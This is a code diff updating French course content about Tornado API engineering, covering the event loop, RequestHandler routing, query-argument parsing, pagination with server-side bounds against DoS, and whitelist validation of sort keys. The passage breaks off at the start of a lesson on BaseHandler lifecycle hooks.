@@ -8,49 +8,79 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d2-l1": {
         "context": (
-            "Après avoir compris les fondations Python (Jour 0) et le protocole réseau HTTP/JSON (Jour 1), nous "
-            "construisons notre premier serveur d'API avec **Tornado (`tornado.web.Application`, `RequestHandler`, `IOLoop`)**.\n"
-            "Pourquoi Tornado est-il un framework d'exception pour maîtriser l'ingénierie des APIs et des services temps réel ? "
-            "Parce qu'il repose sur une architecture **orientée objet (`RequestHandler`)** et une **boucle d'événements non bloquante (`IOLoop`)** "
-            "capable de maintenir des dizaines de milliers de connexions simultanées (problème C10k). "
-            "Ce chapitre explique comment un script Python devient un **démon réseau asynchrone en écoute permanente**, "
-            "comment fonctionne l'`IOLoop`, et comment Tornado aiguille chaque URL vers le bon `RequestHandler`."
+            "Après avoir maîtrisé le modèle mémoire de Python (Jour 0) et la grammaire réseau HTTP/1.1 (Jour 1), nous "
+            "franchissons une étape décisive en construisant notre premier démon réseau asynchrone avec **Tornado "
+            "(`tornado.web.Application`, `RequestHandler`, `HTTPServer`, `IOLoop`)**. Né en 2009 chez FriendFeed (racheté "
+            "par Facebook) sous la plume de Bret Taylor et Ben Darnell pour maintenir des dizaines de milliers de flux "
+            "temps réel ouverts simultanément, Tornado occupe une place à part dans l'écosystème Python.\n\n"
+            "Pourquoi étudier l'ingénierie des APIs à travers Tornado ? Parce qu'il combine la clarté d'une **architecture "
+            "orientée objet (`RequestHandler`)** avec la puissance brute d'un **serveur HTTP non bloquant intégré** bâti "
+            "pour résoudre le célèbre **problème C10K**. Ce chapitre dévoile comment un simple processus Python se "
+            "métamorphose en démon événementiel piloté par `epoll`/`kqueue`, comment l'`IOLoop` orchestre les sockets sans "
+            "bloquer de threads, et comment `self.write()` automatise la sérialisation JSON et le calcul d'`Etag`."
         ),
         "deep_sections": [
             {
-                "heading": "1. Du Script Éphémère au Serveur Event-Loop : le rôle de `tornado.ioloop.IOLoop`",
+                "heading": "1. Le Problème C10K, les Sockets Non Bloquants (`O_NONBLOCK`) et la Boucle `IOLoop` (`epoll`)",
                 "body": (
-                    "Un script Python classique exécute ses lignes de haut en bas puis s'arrête : son processus disparaît "
-                    "de la mémoire.\n"
-                    "Un serveur Web Tornado, au contraire, reste **en éveil 24h/24** grâce à sa boucle d'événements (`IOLoop`) :\n"
-                    "- Lorsque vous appelez `app.listen(8888, address=\"0.0.0.0\")`, Tornado demande au système d'exploitation "
-                    "Linux/Windows d'ouvrir un **Socket TCP non bloquant** attaché au port `8888`.\n"
-                    "- L'instruction `tornado.ioloop.IOLoop.current().start()` démarre la boucle `epoll`/`kqueue`.\n"
-                    "- Dès qu'un client se connecte, Tornado instancie la classe `RequestHandler` associée à l'URL, exécute la méthode "
-                    "correspondant au verbe HTTP (`def get(self):`, `def post(self):`), envoie la trame HTTP de réponse, puis "
-                    "traite immédiatement l'événement suivant."
+                    "Dans un serveur Web synchrone traditionnel (modèle Apache `prefork` ou WSGI multi-threads), chaque "
+                    "connexion cliente entrante monopolise un fil d'exécution (*thread*) dédié du système d'exploitation. "
+                    "Lorsque ce thread attend qu'un client mobile sur un réseau lent transmette ses octets ou qu'une API "
+                    "distante réponde, le noyau endort le thread tout en conservant sa pile d'exécution allouée en RAM "
+                    "(jusqu'à 8 Mo par pile par défaut sous Linux). À dix mille connexions simultanées, la mémoire explose et "
+                    "le processeur s'effondre sous le coût des changements de contexte (*context switching*).\n\n"
+                    "> « Il est temps pour les serveurs Web de gérer dix mille clients simultanément, n'est-ce pas ? Après "
+                    "tout, le Web est désormais un grand système distribué. » — Dan Kegel, The C10K Problem (1999)\n\n"
+                    "#### Multiplexage d'événements noyau par `epoll` et `tornado.ioloop.IOLoop`\n\n"
+                    "Tornado résout le problème C10K en inversant radicalement le modèle d'entrées-sorties. Lorsque vous "
+                    "invoquez `app.listen(8888, address=\"0.0.0.0\")`, Tornado ouvre un descripteur de socket configuré avec "
+                    "le drapeau POSIX **`O_NONBLOCK`** : toute lecture `recv()` alors qu'aucun octet n'est encore arrivé "
+                    "ne bloque jamais le processus, mais retourne instantanément le code noyau `EAGAIN` / `EWOULDBLOCK`. "
+                    "L'appel `tornado.ioloop.IOLoop.current().start()` (adossé depuis Tornado 5/6 à la boucle standard "
+                    "`asyncio`) enregistre alors tous les descripteurs de sockets actifs auprès de l'appel système **`epoll_wait()`** "
+                    "sous Linux (ou `kqueue` sous BSD/macOS, `IOCP` sous Windows). Un **unique fil d'exécution** demeure en "
+                    "veille à consommation CPU nulle et n'est réveillé en temps `O(1)` que pour les sockets précis ayant "
+                    "effectivement reçu des octets prêts à être décodés !"
                 )
             },
             {
-                "heading": "2. Architecture Orientée Objet : Pourquoi chaque route est une classe `RequestHandler` ?",
+                "heading": "2. Modèle Orienté Objet : Instanciation Éphémère de `tornado.web.RequestHandler`",
                 "body": (
-                    "Contrairement aux micro-frameworks basés sur de simples fonctions décorées, Tornado structure chaque route "
-                    "autour d'une classe héritant de **`tornado.web.RequestHandler`** :\n"
-                    "- Chaque verbe HTTP correspond à une méthode dédiée : `def get(self):`, `def post(self):`, `def put(self):`, "
-                    "`def patch(self):`, `def delete(self):`, `def options(self):`.\n"
-                    "- Pour chaque requête entrante, Tornado crée une **nouvelle instance isolée** de votre classe `RequestHandler` : "
-                    "l'objet `self` contient `self.request` (en-têtes, corps, IP) et toutes les méthodes de réponse (`self.write`, "
-                    "`self.set_status`, `self.set_header`, `self.render`)."
+                    "Contrairement aux micro-frameworks fonctionnels où chaque couple `(verbe, URL)` est rattaché à une "
+                    "fonction globale isolée, Tornado regroupe toute la gestion d'une ressource REST au sein d'une **classe "
+                    "héritant de `tornado.web.RequestHandler`**. La table passée à `tornado.web.Application([...])` associe "
+                    "une expression régulière d'URI à cette classe contrôleur, dans laquelle chaque verbe HTTP standard "
+                    "correspond directement à une méthode nommée : `def get(self):`, `def post(self):`, `def put(self):`, "
+                    "`def patch(self):`, `def delete(self):` et `def options(self):`.\n\n"
+                    "#### Cycle d'allocation par requête\n\n"
+                    "À chaque fois que `HTTPServer` achève de lire une trame entrante sur son `IOStream`, `Application` "
+                    "instancie un **nouvel objet `RequestHandler` dédié exclusivement à cette transaction** en lui injectant "
+                    "`self.application` et `self.request` (`HTTPServerRequest`). Si un client tente d'envoyer un `DELETE` sur "
+                    "une classe qui n'implémente que `def get(self):`, Tornado rejette automatiquement l'appel avec le statut "
+                    "normatif **`405 Method Not Allowed`** sans que vous ayez une seule ligne de vérification à écrire."
                 )
             },
             {
-                "heading": "3. Pourquoi `self.write(dictionnaire)` sérialise automatiquement en JSON ?",
+                "heading": "3. Mécanique Interne de `self.write(dict)` : Tampon `_write_buffer`, JSON et `Etag` Automatique",
                 "body": (
-                    "Dans une méthode `RequestHandler` de Tornado, passer un dictionnaire Python `dict` à **`self.write({...})`** "
-                    "accomplit automatiquement 3 opérations indispensables :\n"
-                    "1. Il sérialise votre dictionnaire Python en chaîne JSON UTF-8 valide.\n"
-                    "2. Il écrit les octets dans le tampon de sortie de la requête.\n"
-                    "3. Il injecte automatiquement l'en-tête officiel **`Content-Type: application/json; charset=UTF-8`**."
+                    "Invoquer `self.write(dictionnaire)` dans un `RequestHandler` accomplit bien davantage qu'une simple "
+                    "écriture sur le réseau : Tornado inspecte d'abord `isinstance(chunk, dict)`. Dès qu'un dictionnaire est "
+                    "détecté, le framework le sérialise en UTF-8 via `escape.json_encode()`, positionne automatiquement "
+                    "l'en-tête **`Content-Type: application/json; charset=UTF-8`**, et accumule les octets dans une liste "
+                    "interne `self._write_buffer`.\n\n"
+                    "```python — Ce que self.write(dict) et self.finish() orchestrent automatiquement\n"
+                    "class SanteHandler(tornado.web.RequestHandler):\n"
+                    "    def get(self) -> None:\n"
+                    "        # 1. Sérialise en JSON UTF-8 + pose Content-Type: application/json; charset=UTF-8\n"
+                    "        self.write({\"service\": \"isgp-api\", \"statut\": \"operationnel\"})\n"
+                    "        # 2. À la sortie de get(), Tornado appelle implicitement self.finish() :\n"
+                    "        #    -> Calcule Content-Length + Etag SHA-1 et pousse sur l'IOStream non bloquant\n"
+                    "```\n\n"
+                    "> [!TIP] Validation de cache HTTP gratuite par empreinte `Etag` dans Tornado\n"
+                    "> Juste avant de vider `_write_buffer` sur le socket lors de `finish()`, Tornado calcule automatiquement "
+                    "sur toute réponse `GET 200` l'empreinte cryptographique **`Etag`** du corps généré ! Si le client "
+                    "rappelle ultérieurement la route en joignant `If-None-Match: \"<etag>\"`, Tornado détecte la concordance "
+                    "et répond **`304 Not Modified`** sans renvoyer le corps JSON sur le réseau."
                 )
             }
         ],
@@ -92,8 +122,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Exécutez le code dans l'atelier ci-dessus pour inspecter la table de routage de `tornado.web.Application`.",
-            "Ajoutez un 3ème handler `VersionHandler` associé à `(r\"/api/v1/version\", VersionHandler)` dans l'exécuteur et vérifiez la réponse JSON."
+            "Exécutez `day_2/01_serveur_minimal_tornado.py` dans l'atelier ci-dessus pour inspecter la table de routage compilée par `tornado.web.Application` et vérifier les en-têtes émis.",
+            "Ajoutez une classe `VersionHandler(tornado.web.RequestHandler)` rattachée au motif `r\"/api/v1/version\"` renvoyant `{\"framework\": \"Tornado\", \"modele\": \"IOLoop non-bloquant\"}` et vérifiez son `Content-Type` avec `AsyncHTTPClient`."
         ]
     },
 
@@ -102,65 +132,80 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d2-l2": {
         "context": (
-            "N'importe qui peut créer une URL `/api/faireQuelqueChose` qui renvoie du JSON, mais cela n'en fait pas "
-            "une API **RESTful** professionnelle.\n"
-            "Comment les géants technologiques (Stripe, GitHub, Twilio, Google Cloud) nomment-ils leurs URLs pour "
-            "qu'un développeur externe comprenne intuitivement toute l'API en 5 minutes ? Et comment extraire "
-            "proprement un identifiant d'entité (`/formations/42`) par expression régulière ou un critère de recherche "
-            "(`?salle=Alger`) dans Tornado ? Ce chapitre formalise le **Modèle de Maturité de Richardson** et l'extraction "
-            "des paramètres dans `RequestHandler`."
+            "Exposer une route `/api/traiterDemande` renvoyant du JSON ne suffit nullement à qualifier une architecture "
+            "de **RESTful**. Comment les équipes d'ingénierie de Stripe, GitHub, Cloudflare ou Google Cloud conçoivent-elles "
+            "leurs espaces d'adressage pour qu'un intégrateur externe devine intuitivement le comportement de cent routes "
+            "en quelques minutes ?\n\n"
+            "Dans Tornado, cette rigueur de conception s'appuie directement sur le routeur d'**expressions régulières "
+            "(`tornado.routing` / `URLSpec`)** et sur les accesseurs typés de `RequestHandler`. Ce chapitre relie le "
+            "**Modèle de Maturité de Richardson** aux mécanismes internes de capture de groupes Regex `([0-9]+)` et de "
+            "décodage défensif via `self.get_query_argument()`."
         ),
         "deep_sections": [
             {
-                "heading": "1. Le Modèle de Maturité de Richardson (Niveaux 0, 1, 2 et 3)",
+                "heading": "1. Le Modèle de Maturité de Leonard Richardson (Niveaux 0 à 3) Appliqué à Tornado",
                 "body": (
-                    "Élaboré par Leonard Richardson, ce modèle évalue la qualité architecturale d'une API Web sur 4 niveaux :\n"
-                    "- **Niveau 0 (Le marécage du POX / RPC)** : Une seule URL (`POST /api/service`) reçoit des ordres disparates "
-                    "(`{\"action\": \"getFormation\"}`, `{\"action\": \"deleteFormation\"}`). Le protocole HTTP est sous-exploité.\n"
-                    "- **Niveau 1 (Les Ressources nominales)** : Chaque entité métier possède sa propre adresse URL utilisant "
-                    "un **nom au pluriel** (`/api/v1/formations`, `/api/v1/formations/42`), mais on utilise encore souvent `POST` ou `GET` pour tout.\n"
-                    "- **Niveau 2 (Verbes HTTP + Codes de Statut — Le Standard Industriel)** : L'URL identifie la ressource "
-                    "(`/api/v1/formations/42`) et la **méthode du `RequestHandler`** exprime l'action (`get` pour lire, `post` pour créer, `put`/`patch` "
-                    "pour modifier, `delete` pour supprimer), tandis que la réponse utilise le code de statut exact (`200`, `201`, `404`, `422`).\n"
-                    "- **Niveau 3 (HATEOAS)** : La réponse JSON inclut en plus des liens de navigation (`\"links\": {\"self\": \"/api/v1/formations/42\"}`)."
+                    "Proposé en 2008 par Leonard Richardson, ce référentiel évalue le degré d'exploitation sémantique du "
+                    "protocole HTTP par une API sur quatre paliers progressifs. Au **Niveau 0 (*The Swamp of POX*)**, "
+                    "l'application détourne HTTP en simple tunnel RPC : une unique URL `POST /api/service` reçoit des "
+                    "commandes hétérogènes telles que `{\"action\": \"listerFormations\"}` ou `{\"action\": \"supprimerFormation\"}` "
+                    "en répondant invariablement `200 OK`, rendant tout cache HTTP ou routage proxy aveugle. Le **Niveau 1** "
+                    "découpe le domaine en **ressources nominales au pluriel** dotées chacune de son URI propre "
+                    "(`/api/v1/formations`, `/api/v1/formations/42`), mais continue d'abuser de `GET` ou `POST` pour toutes "
+                    "les mutations.\n\n"
+                    "#### Le Niveau 2 industriel et l'horizon hypermédia HATEOAS (Niveau 3)\n\n"
+                    "Le **Niveau 2** constitue l'étalon-or des APIs REST d'entreprise et épouse exactement la conception de "
+                    "`tornado.web.RequestHandler` : les URIs ne contiennent **jamais de verbes d'action**, uniquement des "
+                    "noms de collections et d'identifiants, tandis que la méthode Python invoquée (`get`, `post`, `put`, "
+                    "`patch`, `delete`) exprime l'opération et que `self.set_status()` restitue l'issue précise (`200`, `201`, "
+                    "`204`, `404`, `409`, `422`). Enfin, le **Niveau 3 (*HATEOAS — Hypermedia As The Engine Of Application "
+                    "State*)** enrichit chaque réponse JSON d'un dictionnaire `\"links\"` guidant dynamiquement le client "
+                    "vers les transitions permises (`\"self\"`, `\"next\"`, `\"inscription\"`)."
                 )
             },
             {
-                "heading": "2. Path Parameters (Groupes Regex `([0-9]+)`) vs Query Parameters (`self.get_query_argument`)",
+                "heading": "2. Mécanique Interne d'`URLSpec` : Groupes Regex Positionnels vs Nommés et `Path` vs `Query`",
                 "body": (
-                    "Quand faut-il mettre un paramètre dans le chemin (`/formations/42`) et quand faut-il le mettre après `?` (`?salle=Alger`) ?\n"
-                    "- **Paramètre de Chemin (`Path Parameter` : `r\"/api/formations/([0-9]+)\"`)** : Utilisé pour "
-                    "**identifier de manière unique une ressource précise**. Dans Tornado, chaque groupe entre parenthèses `(...)` "
-                    "de l'expression régulière est passé en argument à `def get(self, formation_id: str):`. Si l'identifiant n'existe pas "
-                    "en base, le handler renvoie **`404 Not Found`**.\n"
-                    "- **Paramètre de Requête (`Query Parameter` : `/api/formations?salle=Alger&duree_min=3`)** : Utilisé pour "
-                    "**filtrer, trier, rechercher ou paginer** une collection via `self.get_query_argument('salle', None)`. Si aucune formation "
-                    "ne correspond au filtre `?salle=Oran`, ce n'est **pas** une erreur `404` : la collection renvoie **`200 OK` avec une liste vide `[]`** !"
+                    "Lorsque vous enregistrez un tuple `(r\"/api/formations/([0-9]+)\", FormationHandler)` dans "
+                    "`tornado.web.Application`, Tornado l'encapsule dans un objet `tornado.web.URLSpec` qui compile le motif "
+                    "avec `re.compile()` (en ancrant automatiquement la fin par `$` s'il n'est pas déjà présent). Si le motif "
+                    "utilise des **groupes anonymes `([0-9]+)`**, les sous-chaînes capturées sont transmises dans `self.path_args` "
+                    "et passées en arguments positionnels à `def get(self, formation_id: str):`. Si vous utilisez des **groupes "
+                    "nommés Python `(?P<formation_id>[0-9]+)`**, Tornado remplit `self.path_kwargs` et appelle la méthode par "
+                    "mot-clé `def get(self, formation_id: str):`, ce qui sécurise l'ordre des paramètres sur les routes "
+                    "imbriquées complexes.\n\n"
+                    "```python — Groupes nommés (?P<...>) sur une sous-ressource REST hiérarchique\n"
+                    "app = tornado.web.Application([\n"
+                    "    (r\"/api/v1/formations/(?P<formation_id>[0-9]+)/inscrits/(?P<stagiaire_id>[0-9]+)\",\n"
+                    "     InscriptionDetailHandler),\n"
+                    "])\n"
+                    "```\n\n"
+                    "> [!IMPORTANT] Critère architectural : Path Parameter (`404`) contre Query Parameter (`200 + []`)\n"
+                    "> Un **paramètre de chemin** (`/formations/42`) désigne l'identité unique d'une ressource : si l'entité "
+                    "`#42` est absente de la base, le handler doit impérativement répondre **`404 Not Found`**. À l'inverse, "
+                    "un **paramètre de requête** (`?salle=Tamanrasset&duree_min=3`) filtre ou pagine une collection existante : "
+                    "si aucun enregistrement ne satisfait le filtre, la ressource collection `/formations` existe toujours et "
+                    "doit répondre **`200 OK` avec une liste vide `{\"total\": 0, \"data\": []}`** !"
                 )
             },
             {
-                "heading": "3. Lecture défensive avec `self.get_query_argument('cle', default)`",
+                "heading": "3. Décodage Défensif de `self.get_query_argument` et Concordance des 4 Notations d'URI",
                 "body": (
-                    "Dans une URL (`?duree_min=3`), tout paramètre est initialement reçu sous forme de chaîne de caractères `\"3\"`.\n"
-                    "- Si vous appelez `self.get_query_argument(\"ht\")` **sans second argument**, Tornado lève automatiquement "
-                    "une exception `tornado.web.MissingArgumentError` (qui renvoie `HTTP 400 Bad Request`) si le client omet `?ht=`.\n"
-                    "- Si le paramètre est optionnel, passez toujours une valeur par défaut : `self.get_query_argument(\"taux\", \"19.0\")`, "
-                    "puis convertissez-la dans un bloc `try: float(...) except ValueError:`."
-                )
-            },
-            {
-                "heading": "4. Pourquoi voit-on `([0-9]+)`, `:variable`, `<variable>` et `{variable}` selon les outils et frameworks ?",
-                "body": (
-                    "En lisant des documentations d'API ou en utilisant Postman, les développeurs rencontrent quatre notations "
-                    "différentes pour représenter une **variable de chemin (Path Parameter)** :\n"
-                    "1. **`([0-9]+)` ou `(?P<id>[0-9]+)` (Syntaxe Regex Tornado)** :\n"
-                    "   - Tornado utilise toute la puissance du module `re` de Python : `(r\"/api/formations/([0-9]+)\", FormationHandler)`. "
-                    "Le motif `[0-9]+` garantit dès le routeur que seuls des chiffres sont acceptés !\n"
-                    "2. **`<int:id>` (Syntaxe Flask / Django)** : Spécifique à Werkzeug/Flask.\n"
-                    "3. **`:variable` (Syntaxe Postman, Express.js / Node.js)** :\n"
-                    "   - Dans **Postman**, taper `http://127.0.0.1:8888/api/formations/:id` active automatiquement la clé `id` dans *Path Variables*.\n"
-                    "4. **`{variable}` (Syntaxe OpenAPI 3.0 / Swagger & FastAPI)** :\n"
-                    "   - Standard IETF RFC 6570 *URI Template* : `/api/formations/{id}`."
+                    "Dans un `RequestHandler`, la méthode `self.get_query_argument(name, default=_ARG_DEFAULT, strip=True)` "
+                    "opère trois traitements précieux : elle extrait la dernière valeur associée à `name` dans l'URL, la "
+                    "décode en UTF-8 et élague par défaut les espaces parasites en début et fin de chaîne (`strip=True`). "
+                    "Comprendre son second paramètre évite de nombreux bugs : appelée **sans valeur par défaut** "
+                    "(`self.get_query_argument(\"ht\")`), elle lève automatiquement `tornado.web.MissingArgumentError`, une "
+                    "sous-classe de `HTTPError(400)` qui renvoie aussitôt `400 Bad Request` au client si `?ht=` manque. "
+                    "Appelée avec une valeur de repli (`self.get_query_argument(\"taux\", \"19.0\")`), elle garantit le "
+                    "retour d'une chaîne qu'il convient de convertir dans un bloc `try: float(...) except ValueError:`.\n\n"
+                    "#### Pourquoi coexistent `([0-9]+)`, `<int:id>`, `:id` et `{id}` dans votre boîte à outils ?\n\n"
+                    "En ingénierie quotidienne, la même variable de chemin s'écrit sous quatre conventions distinctes qu'il "
+                    "ne faut jamais mélanger d'un fichier à l'autre : Tornado compile des expressions régulières natives "
+                    "`([0-9]+)` dans le code Python serveur ; Flask/Werkzeug utilise des convertisseurs entre chevrons `<int:id>` ; "
+                    "**Postman** (ainsi qu'Express.js) reconnaît le préfixe deux-points `:id` pour peupler son tableau "
+                    "graphique *Path Variables* ; enfin, la norme **OpenAPI 3.0 / IETF RFC 6570 (*URI Template*)** impose les "
+                    "accolades `{id}` dans `/api/openapi.json` et Swagger UI."
                 )
             }
         ],
@@ -208,8 +253,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Dans l'exécuteur ci-dessus, observez les appels simulés sur `/api/v1/stagiaires/2` et `/api/v1/calcul-tva?ht=2500&taux=19`.",
-            "Testez la route réelle `GET /api/sandbox/calcul-tva?ht=2500&taux=19` dans le Client HTTP ou avec `curl`."
+            "Dans l'exécuteur ci-dessus, analysez les requêtes simulées vers `/api/v1/stagiaires/2` et `/api/v1/calcul-tva?ht=2500&taux=19`, puis testez le comportement de `StagiaireJsonHandler` face à `/api/v1/stagiaires/abc`.",
+            "Interrogez l'endpoint réel `GET /api/sandbox/calcul-tva?ht=2500&taux=19` depuis le Client HTTP ou via `curl` en encadrant l'URL de guillemets."
         ]
     },
 
@@ -218,49 +263,72 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d2-l3": {
         "context": (
-            "En développement local, votre table SQLite contient 4 formations : faire `SELECT * FROM formations` et "
-            "tout renvoyer d'un bloc prend 1 milliseconde. Mais que se passe-t-il six mois après la mise en production "
-            "lorsque la table des transactions ou des journaux contient **2 000 000 de lignes** ?\n"
-            "Une requête `GET` sans pagination tentera de charger les 2 millions de lignes en RAM Python, de construire "
-            "un fichier JSON de 800 Mo, de bloquer l'`IOLoop` Tornado et de faire s'écrouler le serveur (*Out Of Memory / OOM*). "
-            "La **Pagination**, le **Filtrage** et le **Tri sécurisé** sont donc obligatoires sur toute route de collection."
+            "Sur un poste de développement contenant quatre formations de démonstration, exécuter `SELECT * FROM formations` "
+            "et sérialiser toute la liste via `self.write()` s'achève en moins d'une milliseconde. Mais projetons ce "
+            "même code six mois après la mise en production, lorsque la table des écritures comptables ou des inscriptions "
+            "totalise **deux millions de lignes**.\n\n"
+            "Dans un serveur événementiel Tornado, une route de collection dépourvue de pagination déclenche une double "
+            "catastrophe : elle sature la mémoire vive du processus jusqu'au tueur noyau *OOM Killer*, et confisque "
+            "surtout le fil unique de l'`IOLoop` pendant plusieurs secondes d'encodage JSON synchrone, paralysant "
+            "instantanément toutes les autres connexions actives. **La Pagination bornée, le Filtrage amont et le Tri "
+            "validé par liste blanche** constituent donc une exigence d'architecture non négociable."
         ),
         "deep_sections": [
             {
-                "heading": "1. L'équation mathématique de la Pagination Offset / Limit",
+                "heading": "1. Algèbre de la Pagination `Offset / Limit` et Métadonnées de Navigation",
                 "body": (
-                    "Le standard universel de pagination repose sur deux paramètres passés dans la Query String : **`page`** "
-                    "(le numéro de page souhaité, commençant à `1`) et **`limit`** (le nombre d'éléments par page, par exemple `10` ou `20`).\n"
-                    "- Pour savoir combien d'éléments sauter depuis le début de la collection (**`offset`**), on applique la formule :\n"
-                    "  **`offset = (page - 1) * limit`**\n"
-                    "  - Pour la `page=1` avec `limit=10` : `offset = (1 - 1) * 10 = 0` → éléments d'indices `0` à `9`.\n"
-                    "  - Pour la `page=2` avec `limit=10` : `offset = (2 - 1) * 10 = 10` → éléments d'indices `10` à `19`.\n"
-                    "  - Pour la `page=3` avec `limit=10` : `offset = (3 - 1) * 10 = 20` → éléments d'indices `20` à `29`.\n"
-                    "- Pour calculer le nombre total de pages (**`total_pages`**) par division entière par excès (plafond) :\n"
-                    "  **`total_pages = max(1, (total_items + limit - 1) // limit)`**."
+                    "Le patron de pagination par pages numérotées repose sur le couple de paramètres de requête `page` "
+                    "(indice humain commençant à `1`) et `limit` (cardinalité maximale d'une tranche, typiquement `10` ou `20`). "
+                    "La projection de ces coordonnées vers un indice de tableau zéro-basé en mémoire Python ou vers une clause "
+                    "SQL `LIMIT ? OFFSET ?` obéit à l'identité arithmétique fondamentale **`offset = (page - 1) * limit`** : "
+                    "la page `1` saute `0` élément (`[0:10]`), la page `2` saute les `10` premiers (`[10:20]`), et la page `k` "
+                    "démarre exactement à `(k - 1) * limit`.\n\n"
+                    "#### Calcul exact du plafond de pages sans flottants\n\n"
+                    "Pour renseigner l'objet `meta` permettant aux frontaux Web et mobiles de dessiner leurs contrôles de "
+                    "navigation, le nombre total de pages se calcule par division entière par excès sur le total filtré "
+                    "`total_items` : **`total_pages = max(1, (total_items + limit - 1) // limit)`** (équivalent exact en "
+                    "arithmétique entière pure de `math.ceil(total_items / limit)` lorsque `total_items > 0`, tout en "
+                    "garantissant `1` page minimale lorsque la recherche renvoie `0` résultat). Les drapeaux booléens "
+                    "`has_next = page < total_pages` et `has_prev = page > 1` dispensent le client de tout recalcul sujet aux "
+                    "erreurs d'arrondi."
                 )
             },
             {
-                "heading": "2. Pourquoi borner impérativement `page` et `limit` côté serveur (Protection Anti-DoS)",
+                "heading": "2. Plafonnement Défensif Anti-DoS (`min` / `max`) pour Protéger la Latence de l'`IOLoop`",
                 "body": (
-                    "Si vous écrivez simplement `limit = int(self.get_query_argument('limit', '10'))`, qu'arrive-t-il si un "
-                    "utilisateur malveillant appelle `?page=-5&limit=999999999` ?\n"
-                    "- Un `page` négatif produirait un `offset` négatif incohérent.\n"
-                    "- Un `limit` de 1 milliard contournerait toute votre protection de pagination !\n"
-                    "On encadre donc toujours les deux valeurs par `max()` et `min()` :\n"
-                    "- `page = max(1, int(self.get_query_argument(\"page\", \"1\")))` (au minimum page 1).\n"
-                    "- `limit = min(50, max(1, int(self.get_query_argument(\"limit\", \"10\"))))` (entre 1 et 50 éléments maximum par appel)."
+                    "Extraire naïvement `limit = int(self.get_query_argument('limit', '10'))` sans borner l'entier obtenu "
+                    "laisse grande ouverte une vulnérabilité de **Déni de Service Applicatif (*Resource Exhaustion DoS*)** : "
+                    "il suffit à un attaquant d'appeler `GET /api/v1/formations?page=-5&limit=999999999` pour provoquer soit "
+                    "un indiçage négatif incohérent en Python (`liste[-50:]`), soit l'extraction intégrale de la base SQL "
+                    "contournant toute votre pagination !\n\n"
+                    "```python — Extraction et bornage défensif strict des coordonnées de pagination\n"
+                    "try:\n"
+                    "    page = max(1, int(self.get_query_argument(\"page\", \"1\")))\n"
+                    "    limit = min(50, max(1, int(self.get_query_argument(\"limit\", \"10\"))))\n"
+                    "except ValueError:\n"
+                    "    self.set_status(400)\n"
+                    "    self.finish({\"erreur\": \"Les paramètres 'page' et 'limit' doivent être des entiers.\"})\n"
+                    "    return\n"
+                    "```\n\n"
+                    "> [!IMPORTANT] Ordre impératif du pipeline de collection : Filtrer -> Compter -> Trier -> Découper\n"
+                    "> La cardinalité `total_items` doit toujours être mesurée **après le filtrage métier** (`?salle=Alger`) "
+                    "mais **avant le découpage de la tranche `[offset : offset + limit]`**. Calculer `len(tranche)` après "
+                    "découpage renverrait systématiquement `2` au lieu du nombre réel d'enregistrements correspondant à la "
+                    "recherche."
                 )
             },
             {
-                "heading": "3. Validation par Liste Blanche (Whitelist) du Tri Dynamique (`?tri=...&ordre=...`)",
+                "heading": "3. Validation par Liste Blanche (*Whitelist*) des Clés de Tri Dynamique",
                 "body": (
-                    "Pour permettre au client de trier les résultats (`?tri=duree_jours&ordre=desc`), le serveur ne doit "
-                    "**jamais** utiliser directement la chaîne envoyée par le client comme nom de clé ou colonne SQL sans vérification.\n"
-                    "On définit un tuple immuable de colonnes autorisées :\n"
-                    "`CHAMPS_TRI_AUTORISES = (\"id\", \"duree_jours\", \"titre\")`.\n"
-                    "Si `champ_tri not in CHAMPS_TRI_AUTORISES`, le `RequestHandler` rejette immédiatement la requête avec un code "
-                    "**`400 Bad Request`** en indiquant la liste des colonnes autorisées."
+                    "Offrir un tri paramétrable tel que `?tri=duree_jours&ordre=desc` exige une barrière de validation "
+                    "explicite sur le nom de l'attribut demandé. En mémoire Python, passer une clé arbitraire choisie par "
+                    "l'appelant à `sorted(resultats, key=lambda x: x[champ_tri])` déclenche une `KeyError` (`HTTP 500`) ou "
+                    "permet de sonder des champs internes non exposés ; en SQL, interpoler ce paramètre dans une clause "
+                    "`ORDER BY` ouvre une faille critique d'**Injection SQL**.\n\n"
+                    "Le standard industriel définit une constante immuable `CHAMPS_TRI_AUTORISES = (\"id\", \"duree_jours\", \"titre\")` "
+                    "ainsi que l'ensemble `ORDRES_AUTORISES = (\"asc\", \"desc\")`. Toute valeur absente de cette liste "
+                    "blanche est immédiatement rejetée par `self.set_status(400)` en énumérant explicitement les colonnes "
+                    "admises au contrat."
                 )
             }
         ],
@@ -302,8 +370,8 @@ ENRICHMENT_D2_D3 = {
             }
         ],
         "practical_exercises": [
-            "Dans l'exécuteur Python ci-dessus, testez la pagination sur la `page = 2` puis la `page = 3` avec `limit = 2`.",
-            "Cliquez sur le bouton « Tester avec Pagination & Tri » pour exécuter `GET /api/sandbox/formations?page=1&limit=2&tri=duree_jours&ordre=desc`."
+            "Dans l'exécuteur Python ci-dessus, interrogez successivement `page=2` puis `page=3` avec `limit=2` et vérifiez la bascule exacte des booléens `a_page_suivante`.",
+            "Actionnez le bouton « Tester la Pagination & le Tri » pour exécuter `GET /api/sandbox/formations?page=1&limit=2&tri=duree_jours&ordre=desc` contre le serveur Tornado actif."
         ]
     },
 
@@ -312,46 +380,75 @@ ENRICHMENT_D2_D3 = {
     # =========================================================================
     "d2-l4": {
         "context": (
-            "Lorsqu'une API compte 50 `RequestHandlers`, comment mesurer le temps d'exécution exact en millisecondes de chaque "
-            "appel, attribuer un numéro de suivi unique (`X-Request-ID`) et ajouter des en-têtes de sécurité sans "
-            "copier-coller les mêmes lignes dans les 50 classes ?\n"
-            "Dans Tornado, la réponse architecturale consiste à définir une classe parente **`BaseHandler(tornado.web.RequestHandler)`** "
-            "qui surcharge les méthodes de cycle de vie **`set_default_headers(self)`**, **`prepare(self)`** et **`on_finish(self)`**."
+            "Lorsqu'une plateforme Tornado fédère cinquante classes `RequestHandler`, comment chronométrer à la "
+            "microseconde près chaque appel entrant, propager un identifiant de corrélation distribué (`X-Request-ID`), "
+            "injecter les en-têtes de durcissement sécurité et consigner un journal d'audit réglementaire sans dupliquer "
+            "une seule ligne de code dans les cinquante contrôleurs ?\n\n"
+            "Là où les frameworks WSGI/ASGI empilent des couches externes de fonctions *middlewares*, Tornado résout "
